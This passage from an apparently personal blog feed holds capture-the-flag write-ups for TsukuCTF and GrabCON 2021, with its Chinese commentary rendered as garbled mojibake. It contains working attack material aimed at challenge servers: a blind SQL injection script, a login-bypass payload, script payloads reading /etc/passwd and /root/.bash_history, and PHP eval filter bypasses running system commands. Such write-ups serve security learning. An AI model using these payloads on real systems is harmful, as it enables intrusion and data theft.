&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mid&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">low&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">end&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select version()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct table_name from information_schema.columnns limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select distinct column_name from information_shcema.columns where table_name=&amp;#39;urtla_secret_tsukushi&amp;#39;limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">33&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select secret from urtla_secret_tsukushi_limit 1 offset &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËøôÊòØÂÆòÊñπwpÈáåÁöÑ‰∫åÂàÜÊ≥ïËÑöÊú¨ÔºåÊääÁÆÄÂçïÁöÑ‰∫ãÊãÜÊàê‰∫Ü3‰∏™ÂáΩÊï∞ÔºåÂÄíÊòØ‰πüÂ•ΩÔºåÂèØÂ§çÁî®ÊÄßmax&lt;/p>
&lt;p>&lt;code>TsukuCTF{U_Are_Geni0us_T$UKUSH1}&lt;/code>&lt;/p>
&lt;h2 id="webjourney">Web/Journey&lt;/h2>
&lt;p>ÊäìÂåÖÁúãÔºåÊúâÂæàÂ§ö307ÈáçÂÆöÂêëÔºåËøò‰ª•‰∏∫ÊòØË∑ü‰πãÂâçÈÇ£‰∏™‰∏ÄÊ†∑Ë¶ÅË∑ë‰∏Ä‰∏ã‰∏ÄÂçÉÂ§öÊ¨°ÁöÑÈáçÂÆöÂêëÔºå‰ΩÜÊòØËøô‰∏™ÈáçÂÆöÂêëÊòØÊúâÈôêÂ∫¶ÁöÑÔºåÊúÄÂêéÁöÑ‰ΩçÁΩÆÊòØ/problems/journey/goalÔºåÂõûÊòæ405ÈîôËØØ&lt;/p>
&lt;p>ÁúãwpÔºåÂ≠¶Âà∞‰∫Ü&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -H &lt;span style="color:#d88200">&amp;#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1&amp;#39;&lt;/span> -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913114745032.png" alt="image-20210913114745032">&lt;/p>
&lt;p>Âà©Áî®ÁöÑÊòØhttpËØ∑Ê±Ç‰∏≠ÁöÑconnectÊñπÊ≥ïÔºåÁõ∏ÂÖ≥ÂÜÖÂÆπÂèØÂèÇËßÅ-&amp;gt;&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/CONNECT">CONNECT(MDN)&lt;/a> | &lt;a href="https://www.jianshu.com/p/54357cdd4736">HTTP‰πãconnect method&lt;/a>&lt;/p>
&lt;h2 id="webgyotaku">Web/gyOTAKU&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120544616.png" alt="image-20210913120544616">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913120625401.png" alt="image-20210913120625401">&lt;/p>
&lt;p>Êª°Ë∂≥17Ë°åË¶ÅÊ±ÇÁöÑËØù‰ºöÈÄöËøáchromium browserÊù•ËøîÂõû‰∏Ä‰∏™Êà™Âõæ&lt;/p>
&lt;p>Êàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™Â¶Ç‰∏ãÁöÑhtmlÈ°µÈù¢&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ËøîÂõû500ÈîôËØØÔºåÂÜçËØï‰∏Ä‰∏ã&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/etc/passwd&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ÊàêÂäüËøîÂõû&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913190757615.png" alt="image-20210913190757615">&lt;/p>
&lt;p>Áî®‰∏Ä‰∏ãÊàë‰ª¨ÁöÑËÄÅÊúãÂèã/root/.bash_history&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/.bash_history&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210913191326852.png" alt="image-20210913191326852">&lt;/p>
&lt;p>ÂèØ‰ª•ËØª‰∏Ä‰∏ãflag‰∫Ü&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;location.href=&amp;quot;/root/flagc464f9eba1.txt&amp;quot;&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>Ê∞¥‰∏ÄÁØáwpÔºåÊ∞¥Ê∞¥Êõ¥ÂÅ•Â∫∑&lt;/p></description></item><item><title>GrabCONCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</link><pubDate>Tue, 07 Sep 2021 11:22:14 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/07/grabconctf2021-wp/</guid><description>&lt;h2 id="webe4sy-pe4sy">Web/E4sy Pe4sy&lt;/h2>
&lt;blockquote>
&lt;p>Hack admin user!&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>‰∏áËÉΩÂØÜÁ†Å &lt;code>username=admin&amp;amp;password=%27%3D%27&lt;/code>&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_pe4sy_SQL_1nj3ct10n}&lt;/code>&lt;/p>
&lt;h2 id="webdoor-lock">Web/Door Lock&lt;/h2>
&lt;blockquote>
&lt;p>The door is open to all! See who is behind the admin door??&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>Âíå‰∏äÈù¢ÈÇ£‰∏™‰∏ÄÊ†∑ÁöÑÂâçÁ´ØÈ°µÈù¢Ôºå‰ΩÜÊòØÂæàÊòæÁÑ∂‰∏áËÉΩÂØÜÁ†ÅÂ§±ÊïàÔºåÈöè‰æøÁôªÂÖ•‰∏Ä‰∏™Âè∑ÔºåÊúâÊ∞¥Âπ≥Ë∂äÊùÉ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904212157898.png" alt="image-20210904212157898">&lt;/p>
&lt;p>Áî®burpË∑ë‰∏Ä‰∏ã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906134840366.png" alt="image-20210906134840366">&lt;/p>
&lt;p>&lt;code>GrabCON{E4sy_1D0R_}&lt;/code>&lt;/p>
&lt;h2 id="webnull-food-factory">Web/Null Food Factory&lt;/h2>
&lt;blockquote>
&lt;p>Prove your hacking skill to get admin panel.&lt;/p>
&lt;p>Author: &lt;strong>r3curs1v3_pr0xy&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>ËøòÊòØ‰∏ÄÊ®°‰∏ÄÊ†∑ÁöÑÂâçÁ´ØÔºåÁõÆÊ†áËøòÊòØ‰ª•adminÁôªÂÖ•&lt;/p>
&lt;p>Áî®Âà∞ÁöÑÊòØNull byte injectionÔºåÂÖà‰ª•&lt;code>admin%00&lt;/code>‰∏∫Áî®Êà∑ÂêçÊ≥®ÂÜå&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105417519.png" alt="image-20210907105417519">&lt;/p>
&lt;p>ÁÑ∂ÂêéÁî®AdminÁöÑÂêçÂ≠óÁôªÂÖ•&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105241455.png" alt="image-20210907105241455">&lt;/p>
&lt;p>&lt;code>GrabCON{Null_byt3s_1s_L0v3}&lt;/code>&lt;/p>
&lt;h2 id="webbasic-calc">Web/Basic Calc&lt;/h2>
&lt;blockquote>
&lt;p>Ever used calc based on php?&lt;/p>
&lt;p>Author: &lt;strong>karma&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[A-Za-z`]+/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$eq&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;BAD.&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Result: &amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; ;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Áé∞Âú®ÁúãÂà∞phpÁöÑÈ¢òÊÑüËßâÈÇ£ÊòØÁõ∏ÂΩìÁöÑ‰∫≤Âàá‰∫Ü‚Ä¶‚Ä¶&lt;/p>
&lt;p>ËôΩÁÑ∂ÊòØÁõ¥Êé•Êúâ‰∫ÜevalÔºå‰ΩÜÊòØËøô‰∏™Ê≠£ÂàôËøáÊª§ÁöÑÊúâÁÇπÁã†ÔºåÂ≠óÊØçÂÖ®Ë¢´banÊéâ Â∞±Âè™ËÉΩÁî®xorÊàñÂÖ´ËøõÂà∂ÁöÑÊñπÂºèÊù•ÊääÂ≠óÊØçÊêûÂá∫Êù•&lt;/p>
&lt;p>ÂÖ´ËøõÂà∂ÁâàÊú¨Ôºö&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\154\163&amp;quot;)
// &amp;quot;system&amp;quot;(&amp;quot;ls&amp;quot;)
&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164&amp;quot;)
// &amp;quot;system(&amp;quot;cat /flagggg.txt&amp;quot;)&amp;quot;
&lt;/code>&lt;/pre>&lt;p>xor&lt;/p>
&lt;pre tabindex="0">&lt;code>Ouput:
(&amp;quot;system&amp;quot;)(&amp;quot;cat /flagggg.txt&amp;quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907111823056.png" alt="image-20210907111823056">&lt;/p>
&lt;p>&lt;code>GrabCON{b4by_php_f0r_y0u}&lt;/code>&lt;/p>
&lt;p>ÂèÇËÄÉÔºö &lt;a href="https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/">https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/&lt;/a> | &lt;a href="https://ctf.0xff.re/2021/uiuctf_2021/phpfuck">https://ctf.0xff.re/2021/uiuctf_2021/phpfuck&lt;/a> | &lt;a href="https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md">https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md&lt;/a> | &lt;a href="https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264">https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264&lt;/a>&lt;/p>
&lt;h2 id="osintprotondate">OSINT/ProtonDate&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the date, when was this email created?&lt;/p>
&lt;p>sc4ry_gh0st@protonmail[dot]com&lt;/p>
&lt;p>GrabCON{dd_mm_yyyy}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>ËØ¥ÂÆûËØù ÊòØÁ∫ØÁåúÁöÑ&lt;/p>
&lt;p>&lt;code>GrabCON{03_09_2021}&lt;/code>&lt;/p>
&lt;p>‰ΩÜÊòØÁúã‰∫Üwp‰πãÂêéÂèëÁé∞ËøôÁ°ÆÂÆûÊúâÊ≠£ËßÑÁöÑÂÅöÊ≥ïÔºå‰∏Ä‰∏™ÂºÄÊ∫êÂ∑•ÂÖ∑Âè´&lt;a href="https://github.com/pixelbubble/ProtOSINT">ProtOSINT&lt;/a>ÔºåÊâÄ‰ΩøÁî®ÁöÑapiÂ¶Ç‰∏ã&lt;/p>
&lt;pre tabindex="0">&lt;code>https://api.protonmail.ch/pks/lookup?op=index&amp;amp;search=sc4ry_gh0st@protonmail.com
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906131321553.png" alt="image-20210906131321553">ÊãøÂà∞Êó∂Èó¥Êà≥1630658267ÔºåÂç≥Fri 3 September 2021 08:37:47 UTC&lt;/p>
&lt;h2 id="osintvictim-1">OSINT/Victim 1&lt;/h2>
&lt;blockquote>
&lt;p>We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?&lt;/p>
&lt;p>&lt;a href="http://31.207.115.133:8080/cgi-bin/faststream.jpg?stream=half&amp;amp;fps=15&amp;amp;rand=COUNTER">Live Camera&lt;/a>&lt;/p>
&lt;p>GrabCON{zipcode}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>Áªô‰∫Ü‰∏Ä‰∏™ÊëÑÂÉèÂ§¥ÁöÑÂú∞ÂùÄÔºåÁî®&lt;a href="https://www.iplocation.net/ip-lookup">IP geolocation lookup&lt;/a>Êü•‰∏Ä‰∏ãÂú∞ÁÇπ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906210732263.png" alt="image-20210906210732263">&lt;/p>
&lt;p>ÁîªÈù¢Âè≥‰∏äÊúâ‰∏™Âú®Âä®ÁöÑÁºÜËΩ¶&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211008725.png" alt="image-20210906211008725">&lt;/p>
&lt;p>zipcode: 39031&lt;/p>
&lt;p>&lt;code>GrabCON{39031}&lt;/code>&lt;/p>
&lt;h2 id="osintwebsite">OSINT/Website&lt;/h2>
&lt;blockquote>
&lt;p>My friend is having a website named, &amp;ldquo;Great Animals Here&amp;rdquo;. He have leaked the flag on his website. Can you find the flag?&lt;/p>
&lt;p>Hint: He used free website builder tool to create his site. greatanimalshere&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;a href="https://greatanimalshere.weebly.com/">https://greatanimalshere.weebly.com/&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101731335.png" alt="image-20210907101731335">&lt;/p>
&lt;h2 id="osintthe-tour1">OSINT/The Tour(1)&lt;/h2>
&lt;blockquote>
&lt;p>w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211622007.png" alt="image-20210906211622007">&lt;/p>
&lt;p>Á©∫ÁöÑÔºåËØï‰∏Ä‰∏ãwayback machine&lt;/p>
&lt;pre tabindex="0">&lt;code>https://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/
&lt;/code>&lt;/pre>&lt;p>‰πüÊòØÁ©∫ÁöÑÔºåÁî®&lt;a href="https://github.com/sherlock-project/sherlock">sherlock&lt;/a>Êü•‰∏Ä‰∏ã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906214255872.png" alt="image-20210906214255872">&lt;/p>
&lt;p>ÂêéÈù¢ÁöÑÂÜÖÂÆπÂèØ‰ª•&lt;a href="https://kashmir54.github.io/ctfs/GrabCON/#the-tour1">ËØ¶ËßÅwp&lt;/a>‰∫ÜÔºåÂæàÂ∞ëÂÅöOSINTÔºå‰ΩÜÊòØÊÑüËßâÂ•ΩÊúâÊÑèÊÄùÔºåÂ∞±ÊòØÊâæÁöÑÂ•ΩÈ∫ªÁÉ¶ÔºåËÑëÊ¥ûÂ•ΩÂ§ßÔºå‰∏çÂÆπÊòìÂïä&lt;/p>
&lt;h2 id="osintthe-tour2">OSINT/The Tour(2)&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>wp-&amp;gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2&lt;/p>
&lt;h2 id="miscwelcome">Misc/Welcome&lt;/h2>
&lt;blockquote>
&lt;p>GrabCON{welcome_to_grabcon_2021}&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{welcome_to_grabcon_2021}&lt;/code>&lt;/p>
&lt;h2 id="miscdiscord">Misc/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Join our &lt;a href="https://discord.gg/8F9VMVCWb2">discord&lt;/a> server!&lt;/p>
&lt;/blockquote>
&lt;p>ÊÜ®ÊâπÊú∫Âô®‰∫∫ÔºåÊàëÊ≤°ÊêûÊòéÁôΩËøô‰∏™ÊòØÊÄé‰πàÁé©ÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905092539802.png" alt="image-20210905092539802">&lt;/p>
&lt;p>tmd ËØï‰∫ÜÂ•Ω‰πÖ ÁªìÊûúÁ´üÁÑ∂Âú®#role&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906121117043.png" alt="image-20210906121117043">&lt;/p>
&lt;p>&lt;code>GrabCON{s@n1ty_fl4g_1s_here}&lt;/code>&lt;/p>
&lt;p>fxxxk&lt;/p>
&lt;h2 id="miscyoutube">Misc/YouTube&lt;/h2>
&lt;blockquote>
&lt;p>Find us on YouTube.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}&lt;/code>&lt;/p>
&lt;h2 id="miscfind-me">Misc/Find me&lt;/h2>
&lt;blockquote>
&lt;p>Checkout author&amp;rsquo;s social media.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905103746359.png" alt="image-20210905103746359">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101222360.png" alt="image-20210907101222360">&lt;/p>
&lt;p>&lt;code>GrabCON{n0_fl4g_h3r3}&lt;/code>&lt;/p>
&lt;h2 id="cryptowarm-up">Crypto/Warm-up&lt;/h2>
&lt;blockquote>
&lt;p>Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)&amp;amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVV